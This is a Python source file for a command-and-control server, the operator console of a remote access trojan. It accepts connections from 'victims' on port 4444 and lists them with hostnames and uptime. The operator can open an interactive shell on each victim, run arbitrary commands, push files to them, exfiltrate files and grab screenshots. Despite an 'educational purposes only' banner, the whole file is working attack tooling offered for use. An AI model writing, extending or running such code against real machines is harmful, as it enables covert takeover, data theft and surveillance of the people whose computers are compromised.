


"""
C2 Framework Server
Features:
  - Victim list with interact command
  - Rich terminal UI
  - Screenshot handling
  - File upload (server → client)
  - File download (client → server)
  - Multiple victims via threading
"""

import socket
import base64
import threading
import os
import time
from pathlib import Path
from datetime import datetime

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich.live import Live
from rich import box
from rich.text import Text

# ================================================================
#  CONFIG
# ================================================================
HOST        = "0.0.0.0"
PORT        = 4444
SEPARATOR   = "<sep>"
FILE_START  = "<FILE_START>"
FILE_END    = "<FILE_END>"
UPLOAD_START = "<UPLOAD_START>"
UPLOAD_END   = "<UPLOAD_END>"
HEADER_SIZE = 8
BUFFER_SIZE = 4096
TIMEOUT     = 300

DOWNLOADS_DIR  = Path("downloads")
SCREENSHOTS_DIR = Path("screenshots")
UPLOADS_DIR    = Path("uploads")
DOWNLOADS_DIR.mkdir(exist_ok=True)
SCREENSHOTS_DIR.mkdir(exist_ok=True)
UPLOADS_DIR.mkdir(exist_ok=True)

console = Console()

# ================================================================
#  VICTIM REGISTRY
# ================================================================
victims      = {}   # id → VictimSession
victims_lock = threading.Lock()
next_id      = 0

class VictimSession:
    def __init__(self, vid, conn, addr):
        self.id        = vid
        self.conn      = conn
        self.addr      = addr
        self.ip        = addr[0]
        self.port      = addr[1]
        self.connected = True
        self.cwd       = "unknown"
        self.hostname  = "unknown"
        self.connected_at = datetime.now()
        self.last_seen    = datetime.now()
        self.lock         = threading.Lock()

    def uptime(self):
        delta = datetime.now() - self.connected_at
        h, rem = divmod(int(delta.total_seconds()), 3600)
        m, s   = divmod(rem, 60)
        return f"{h:02d}:{m:02d}:{s:02d}"

# ================================================================
#  PROTOCOL HELPERS
# ================================================================
def send_message(sock, message):
    try:
        if isinstance(message, str):
            message = message.encode()
        header = f"{len(message):<{HEADER_SIZE}}".encode()
        sock.sendall(header + message)
        return True
    except (ConnectionResetError, BrokenPipeError, OSError):
        return False

def recv_all(sock, n):
    data = b""
    while len(data) < n:
        try:
            packet = sock.recv(min(n - len(data), BUFFER_SIZE))
            if not packet:
                return None
            data += packet
        except (ConnectionResetError, TimeoutError, OSError):
            return None
    return data

def recv_message(sock):
    try:
        header = recv_all(sock, HEADER_SIZE)
        if not header:
            return None
        msg_len = int(header.decode().strip())
        data = recv_all(sock, msg_len)
        if not data:
            return None
        return data.decode(errors="replace")
    except (ValueError, UnicodeDecodeError, ConnectionResetError, OSError):
        return None

# ================================================================
#  FILE HELPERS
# ================================================================
def save_file(content, filename, directory):
    try:
        filepath = directory / filename
        counter = 1
        while filepath.exists():
            stem   = filepath.stem
            suffix = filepath.suffix
            filepath = directory / f"{stem}_{counter}{suffix}"
            counter += 1
        with open(filepath, "wb") as f:
            f.write(content)
        return filepath
    except Exception as e:
        console.print(f"[red][-] Error saving file: {e}[/red]")
        return None

# ================================================================
#  VICTIM LISTENER THREAD
#  Runs in background, accepts new connections
# ================================================================
def victim_listener(server_sock):
    global next_id
    while True:
        try:
            conn, addr = server_sock.accept()
            with victims_lock:
                vid = next_id
                next_id += 1
                session = VictimSession(vid, conn, addr)
                victims[vid] = session

            # start background thread to keep session alive
            t = threading.Thread(
                target=session_monitor,
                args=(session,),
                daemon=True
            )
            t.start()
            console.print(f"\n[bold green][+] New victim [{vid}] connected from {addr[0]}:{addr[1]}[/bold green]")
        except OSError:
            break

def session_monitor(session):
    """Keeps track of session health — marks disconnected when socket dies"""
    session.conn.settimeout(TIMEOUT)
    # Send a quick hostname probe
    try:
        if send_message(session.conn, "hostname"):
            resp = recv_message(session.conn)
            if resp and SEPARATOR in resp:
                output, cwd = resp.split(SEPARATOR, 1)
                session.hostname = output.strip()
                session.cwd      = cwd.strip()
    except:
        pass

# ================================================================
#  RESPONSE HANDLER
#  Parses whatever the client sends back
# ================================================================
def handle_response(session, cmd, response):
    # ── file download ─────────────────────────────────────────────
    if FILE_START in response and FILE_END in response:
        file_data = response.split(FILE_START)[1].split(FILE_END)[0]
        if SEPARATOR in file_data:
            filename, content = file_data.split(SEPARATOR, 1)
            try:
                file_content = base64.b64decode(content)
                saved = save_file(file_content, filename, DOWNLOADS_DIR)
                if saved:
                    console.print(f"[green][+] Downloaded '{filename}' → {saved}[/green]")
                else:
                    console.print("[red][-] Failed to save file[/red]")
            except Exception as e:
                console.print(f"[red][-] Download error: {e}[/red]")

    # ── screenshot ────────────────────────────────────────────────
    elif cmd.lower().startswith(".screenshot") and len(response) > 100:
        try:
            filename  = f"screenshot_{session.ip}_{int(time.time())}.png"
            saved     = save_file(base64.b64decode(response), filename, SCREENSHOTS_DIR)
            if saved:
                console.print(f"[green][+] Screenshot saved → {saved}[/green]")
        except Exception as e:
            console.print(f"[red][-] Screenshot error: {e}[/red]")

    # ── normal output with cwd ────────────────────────────────────
    elif SEPARATOR in response:
        output, cwd = response.split(SEPARATOR, 1)
        session.cwd = cwd.strip()
        if output.strip():
            console.print(Panel(
                output.rstrip(),
                title=f"[cyan]Output[/cyan]",
                subtitle=f"[dim]cwd: {cwd.strip()}[/dim]",
                border_style="dim"
            ))
        else:
            console.print(f"[dim](no output)  cwd: {cwd.strip()}[/dim]")

    # ── raw response ──────────────────────────────────────────────
    else:
        console.print(response)

# ================================================================
#  UPLOAD COMMAND
#  Sends a local file to the victim
# ================================================================
def upload_file(session, local_path, remote_name=None):
    path = Path(local_path)
    if not path.exists():
        console.print(f"[red][-] Local file not found: {local_path}[/red]")
        return

    remote_name = remote_name or path.name
    try:
        with open(path, "rb") as f:
            content = f.read()
        encoded = base64.b64encode(content).decode()
        payload = f"{UPLOAD_START}{remote_name}{SEPARATOR}{encoded}{UPLOAD_END}"
        console.print(f"[yellow][*] Uploading {path.name} ({len(content)} bytes)...[/yellow]")
        if send_message(session.conn, payload):
            response = recv_message(session.conn)
            if response:
                # parse out the <sep>cwd part if present
                if SEPARATOR in response:
                    msg, cwd = response.split(SEPARATOR, 1)
                    session.cwd = cwd.strip()
                    console.print(f"[green]{msg.strip()}[/green]")
                else:
                    console.print(f"[green]{response}[/green]")
        else:
            console.print("[red][-] Upload failed[/red]")
    except Exception as e:
        console.print(f"[red][-] Upload error: {e}[/red]")

# ================================================================
#  VICTIM TABLE
# ================================================================
def print_victims():
    table = Table(
        title="[bold cyan]Connected Victims[/bold cyan]",
        box=box.ROUNDED,
        border_style="cyan",
        show_lines=True,
        expand=True
    )
    table.add_column("ID",       style="bold yellow", width=4,  no_wrap=True)
    table.add_column("IP",       style="cyan",        width=15, no_wrap=True)
    table.add_column("Hostname", style="white",       width=22, no_wrap=True)
    table.add_column("CWD",      style="dim",         min_width=20)
    table.add_column("Status",   style="bold",        width=8,  no_wrap=True)
    table.add_column("Uptime",   style="green",       width=10, no_wrap=True)

    with victims_lock:
        if not victims:
            table.add_row("—", "—", "—", "—", "[dim]waiting[/dim]", "—")
        else:
            for vid, s in victims.items():
                status = "[green]ONLINE[/green]" if s.connected else "[red]OFFLINE[/red]"
                table.add_row(
                    str(vid),
                    s.ip,
                    s.hostname,
                    s.cwd,
                    status,
                    s.uptime()
                )

    console.print(table)

# ================================================================
#  INTERACTIVE SHELL WITH A VICTIM
# ================================================================
def interact(vid):
    with victims_lock:
        session = victims.get(vid)

    if not session:
        console.print(f"[red][-] No victim with ID {vid}[/red]")
        return

    console.print(Panel(
        f"[bold green]Interacting with victim [{vid}] — {session.ip}[/bold green]\n"
        f"[dim]Type 'background' to return to main menu[/dim]\n"
        f"[dim]Type 'upload <local_file> [remote_name]' to send a file[/dim]\n"
        f"[dim]Type '.screenshot' to capture screen[/dim]",
        border_style="green"
    ))

    while True:
        try:
            cmd = Prompt.ask(f"[bold yellow]Shell ({session.ip})[/bold yellow]").strip()

            if not cmd:
                continue

            # ── background — return to main menu ─────────────────
            if cmd.lower() == "background":
                console.print("[yellow][*] Backgrounding session...[/yellow]")
                break

            # ── upload — send file to victim ──────────────────────
            if cmd.lower().startswith("upload "):
                parts = cmd.split()
                local  = parts[1] if len(parts) > 1 else ""
                remote = parts[2] if len(parts) > 2 else None
                upload_file(session, local, remote)
                continue

            # ── send command to victim ────────────────────────────
            if not send_message(session.conn, cmd):
                console.print("[red][-] Failed to send — victim disconnected[/red]")
                session.connected = False
                break

            if cmd.lower() == "exit":
                session.connected = False
                break

            # ── receive response ──────────────────────────────────
            response = recv_message(session.conn)
            if response is None:
                console.print("[red][-] Victim disconnected[/red]")
                session.connected = False
                break

            session.last_seen = datetime.now()
            handle_response(session, cmd, response)

        except KeyboardInterrupt:
            console.print("\n[yellow][*] Use 'background' to return to menu[/yellow]")
            continue

# ================================================================
#  MAIN MENU
# ================================================================
def print_banner():
    console.print(Panel(
        "[bold cyan]C2 Framework[/bold cyan]\n"
        "[dim]Educational purposes only[/dim]",
        box=box.DOUBLE,
        border_style="cyan",
        width=50
    ))

def print_help():
    table = Table(box=box.SIMPLE, show_header=False)
    table.add_column("Command", style="bold yellow", width=25)
    table.add_column("Description", style="white")

    table.add_row("victims",           "List all connected victims")
    table.add_row("interact <id>",     "Interact with a victim")
    table.add_row("kill <id>",         "Disconnect a victim")
    table.add_row("help",              "Show this menu")
    table.add_row("exit",              "Shut down server")
    table.add_row("─── Shell Commands ───", "")
    table.add_row("upload <f> [name]", "Upload file to victim")
    table.add_row(".screenshot",       "Capture victim screen")
    table.add_row("download <file>",   "Download file from victim")
    table.add_row("background",        "Return to main menu")

    console.print(table)

def main():
    print_banner()

    # start TCP listener
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind((HOST, PORT))
    server_sock.listen(10)

    console.print(f"[green][*] Listening on {HOST}:{PORT}[/green]")
    console.print(f"[dim][*] Downloads → {DOWNLOADS_DIR.absolute()}[/dim]")
    console.print(f"[dim][*] Screenshots → {SCREENSHOTS_DIR.absolute()}[/dim]")
    console.print(f"[dim][*] Uploads → {UPLOADS_DIR.absolute()}[/dim]\n")

    # background thread accepts new victims
    listener_thread = threading.Thread(
        target=victim_listener,
        args=(server_sock,),
        daemon=True
    )
    listener_thread.start()

    print_help()

    # ── main command loop ─────────────────────────────────────────
    while True:
        try:
            cmd = Prompt.ask("\n[bold cyan]C2[/bold cyan]").strip()

            if not cmd:
                continue

            # victims — show victim table
            elif cmd.lower() == "victims":
                print_victims()

            # interact <id>
            elif cmd.lower().startswith("interact "):
                try:
                    vid = int(cmd.split()[1])
                    interact(vid)
                except (IndexError, ValueError):
                    console.print("[red][-] Usage: interact <id>[/red]")

            # kill <id>
            elif cmd.lower().startswith("kill "):
                try:
                    vid = int(cmd.split()[1])
                    with victims_lock:
                        s = victims.get(vid)
                    if s:
                        send_message(s.conn, "exit")
                        s.conn.close()
                        s.connected = False
                        console.print(f"[yellow][*] Victim [{vid}] killed[/yellow]")
                    else:
                        console.print(f"[red][-] No victim {vid}[/red]")
                except (IndexError, ValueError):
                    console.print("[red][-] Usage: kill <id>[/red]")

            # help
            elif cmd.lower() == "help":
                print_help()

            # exit
            elif cmd.lower() == "exit":
                console.print("[yellow][*] Shutting down...[/yellow]")
                server_sock.close()
                break

            else:
                console.print(f"[red][-] Unknown command: {cmd}[/red]")
                console.print("[dim]Type 'help' for available commands[/dim]")

        except KeyboardInterrupt:
            console.print("\n[yellow][*] Type 'exit' to quit[/yellow]")

if __name__ == "__main__":
    main()